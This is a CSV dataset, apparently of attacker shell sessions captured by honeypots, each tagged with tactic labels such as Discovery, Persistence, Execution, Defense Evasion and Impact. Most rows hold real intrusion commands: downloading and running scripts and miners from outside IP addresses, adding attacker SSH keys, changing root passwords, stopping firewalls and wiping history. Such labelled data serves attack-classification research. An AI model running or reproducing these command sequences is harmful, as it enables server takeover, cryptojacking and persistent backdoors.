,session,labels
enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox HMNKY ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox HMNKY ; tftp ; wget ; /bin/busybox HMNKY ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox HMNKY ; rm .s ; exit;,enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox HMNKY ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox HMNKY ; tftp ; wget ; /bin/busybox HMNKY ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox HMNKY ; rm .s ; exit;,Discovery - 18 -- Defense Evasion - 20
uname -s -r ; get system status ;,uname -s -r ; get system status ;,Discovery - 1
mkdir /tmp/.xs/ ; cat > /tmp/.xs/test.mod ; chmod 777 /tmp/.xs/daemon.mips.mod ; chmod 777 /tmp/.xs/test.mod ; /tmp/.xs/test.mod ; /tmp/.xs/daemon.mips.mod ;,mkdir /tmp/.xs/ ; cat > /tmp/.xs/test.mod ; chmod 777 /tmp/.xs/daemon.mips.mod ; chmod 777 /tmp/.xs/test.mod ; /tmp/.xs/test.mod ; /tmp/.xs/daemon.mips.mod ;,Execution - 5
LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local ; LC_ALL=C crontab -l ; scp -t ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C chattr -i -a ~/.dhpcd ; LC_ALL=C rm -f ~/.dhpcd ; LC_ALL=C rmdir ~/.dhpcd ; scp -t ~/.dhpcd ; LC_ALL=C ~/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a /etc/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a /etc/shadow ; LC_ALL=C mkdir -p ~/.ssh ; LC_ALL=C chmod 700 ~/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~/.ssh/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~/.ssh/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/knrm ; scp -t /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C rm -f /home/admin/.dhpcd ; scp -t /home/admin/.dhpcd ; LC_ALL=C /home/admin/.dhpcd -o 127.0.0.1:4444 -B > > /dev/null /dev/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i /var/spool/cron/crontabs/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f /tmp/r /tmp/knrm ;,LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local ; LC_ALL=C crontab -l ; scp -t ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C chattr -i -a ~/.dhpcd ; LC_ALL=C rm -f ~/.dhpcd ; LC_ALL=C rmdir ~/.dhpcd ; scp -t ~/.dhpcd ; LC_ALL=C ~/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a /etc/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a /etc/shadow ; LC_ALL=C mkdir -p ~/.ssh ; LC_ALL=C chmod 700 ~/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~/.ssh/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~/.ssh/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/knrm ; scp -t /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C rm -f /home/admin/.dhpcd ; scp -t /home/admin/.dhpcd ; LC_ALL=C /home/admin/.dhpcd -o 127.0.0.1:4444 -B > > /dev/null /dev/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i /var/spool/cron/crontabs/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f /tmp/r /tmp/knrm ;,Discovery - 1 -- Execution - 3 -- Execution - 10 -- Discovery - 23 -- Persistence - 26 -- Discovery - 28 -- Execution - 30 -- Defense Evasion - 31 -- Execution - 33 -- Defense Evasion - 34 -- Execution - 40 -- Defense Evasion - 41 -- Execution - 48 -- Defense Evasion - 49
scp -t /tmp/Muw3fuvA ; scp -t /tmp/Muw3fuvA ; cd /tmp && chmod +x Muw3fuvA && bash -c ./Muw3fuvA ; ./Muw3fuvA ; cd /tmp && chmod +x Muw3fuvA && bash -c ./Muw3fuvA ; ./Muw3fuvA ;,scp -t /tmp/Muw3fuvA ; cd /tmp && chmod +x Muw3fuvA && bash -c ./Muw3fuvA ; ./Muw3fuvA ;,Execution - 4
echo -n 8872qksQ | md5sum ;,echo -n 8872qksQ | md5sum ;,Harmless - 1
"cat /proc/cpuinfo | grep name | wc -l ; echo root:HGbB4i9gUXMh | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ;","cat /proc/cpuinfo | grep name | wc -l ; echo root:HGbB4i9gUXMh | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ;",Discovery - 2 -- Persistence - 5 -- Discovery - 24
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ; wget http://192.241.151.14/bins.sh ; chmod 777 bins.sh ; sh bins.sh ; tftp 192.241.151.14 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 192.241.151.14 ; chmod 777 tftp2.sh ; sh tftp2.sh ; ftpget -v -u anonymous -p anonymous -P 21 192.241.151.14 ftp1.sh ftp1.sh ; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh ;,cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ; wget http://192.241.151.14/bins.sh ; chmod 777 bins.sh ; sh bins.sh ; tftp 192.241.151.14 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 192.241.151.14 ; chmod 777 tftp2.sh ; sh tftp2.sh ; ftpget -v -u anonymous -p anonymous -P 21 192.241.151.14 ftp1.sh ftp1.sh ; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh ;,Execution - 15
"cat /proc/cpuinfo | grep name | wc -l ; echo -e pcnv81k7W9cAOnonv81k7W9cAOno | passwd | bash ; echo pcnv81k7W9cAOnonv81k7W9cAOnon | passwd ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin pc > /tmp/up.txt ; rm -rf /var/tmp/dota* ;","cat /proc/cpuinfo | grep name | wc -l ; echo -e pcnv81k7W9cAOnonv81k7W9cAOno | passwd | bash ; echo pcnv81k7W9cAOnonv81k7W9cAOnon | passwd ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin pc > /tmp/up.txt ; rm -rf /var/tmp/dota* ;",Discovery - 2 -- Persistence - 8 -- Discovery - 33
ifconfig -a || /sbin/ifconfig -a || busybox ifconfig -a ;,ifconfig -a || /sbin/ifconfig -a || busybox ifconfig -a ;,Discovery - 2
"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo -e 123n8kosrde4tS1In8kosrde4tS1I | passwd | bash ; Enter new UNIX password: ; echo 123n8kosrde4tS1In8kosrde4tS1In | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;","cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo -e 123n8kosrde4tS1In8kosrde4tS1I | passwd | bash ; Enter new UNIX password: ; echo 123n8kosrde4tS1In8kosrde4tS1In | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Harmless - 12 -- Persistence - 14 -- Discovery - 56
show system version ; version ;,show system version ; version ;,Discovery - 1
cd /var/tmp ; pkill java ; killall java ; pkill cnrig ; rm -rf xmrig ; rm -rf .black xmrig.1 ; pkill xmrig ; killall cnrig ; killall xmrig ; wget -q ftp://45.133.1.158/xmrig --no-check-certificate || curl -s -L -O ftp://91.198.123.253/xmrig ; chmod +x xmrig ; ./xmrig ; rm -rf .bash_history ; history -c ; rm -rf ~/.bash_history ; wget -q ftp://91.198.123.253/crontab --no-check-certificate || curl -s -L -O ftp://91.198.123.253/crontab ; chmod +x crontab ; ./crontab ; wget -q ftp://91.198.123.253/criptare --no-check-certificate || curl -L -s -O ftp://91.198.123.253/criptare ; chmod +x criptare ; ./criptare ;,cd /var/tmp ; pkill java ; killall java ; pkill cnrig ; rm -rf xmrig ; rm -rf .black xmrig.1 ; pkill xmrig ; killall cnrig ; killall xmrig ; wget -q ftp://45.133.1.158/xmrig --no-check-certificate || curl -s -L -O ftp://91.198.123.253/xmrig ; chmod +x xmrig ; ./xmrig ; rm -rf .bash_history ; history -c ; rm -rf ~/.bash_history ; wget -q ftp://91.198.123.253/crontab --no-check-certificate || curl -s -L -O ftp://91.198.123.253/crontab ; chmod +x crontab ; ./crontab ; wget -q ftp://91.198.123.253/criptare --no-check-certificate || curl -L -s -O ftp://91.198.123.253/criptare ; chmod +x criptare ; ./criptare ;,Impact - 8 -- Execution - 23
w ; cat /etc/shadow ; exit ;,w ; cat /etc/shadow ; exit ;,Discovery - 2
wget https://github.com/xmrig/xmrig/releases/download/v2.14.0/xmrig-2.14.0-xenial-x64.tar.gz ; tar zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -xzf xmrig-2.14.0-xenial-x64.tar.gz ;,wget https://github.com/xmrig/xmrig/releases/download/v2.14.0/xmrig-2.14.0-xenial-x64.tar.gz ; tar zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -zf xmrig-2.14.0-xenial-x64.tar.gz ; ls ; tar -xzf xmrig-2.14.0-xenial-x64.tar.gz ;,Harmless - 7
echo -e msinnfWVKlHrc5n2nnfWVKlHrc5n2 | passwd | bash ; Enter new UNIX password: ; Enter new UNIX password: ;,echo -e msinnfWVKlHrc5n2nnfWVKlHrc5n2 | passwd | bash ; Enter new UNIX password: ; Enter new UNIX password: ;,Persistence - 2 -- Harmless - 4
/etc/init.d/iptables stop ; wget http://218.60.67.92:8899/TF8899 ; $ nohup TF8899 & echo ./TF8899& >> /etc/rc.local ; exit ;,/etc/init.d/iptables stop ; wget http://218.60.67.92:8899/TF8899 ; $ nohup TF8899 & echo ./TF8899& >> /etc/rc.local ; exit ;,Impact - 0 -- Persistence - 3
"cat /proc/cpuinfo | grep name | wc -l ; echo -e 1q2w3enJa74N8DYMrbdnJa74N8DYMrbd | passwd | bash ; Enter new UNIX password: ; echo 1q2w3enJa74N8DYMrbdnJa74N8DYMrbdn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;","cat /proc/cpuinfo | grep name | wc -l ; echo -e 1q2w3enJa74N8DYMrbdnJa74N8DYMrbd | passwd | bash ; Enter new UNIX password: ; echo 1q2w3enJa74N8DYMrbdnJa74N8DYMrbdn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;",Discovery - 2 -- Persistence - 5 -- Harmless - 6 -- Persistence - 8 -- Discovery - 29 -- Persistence - 35
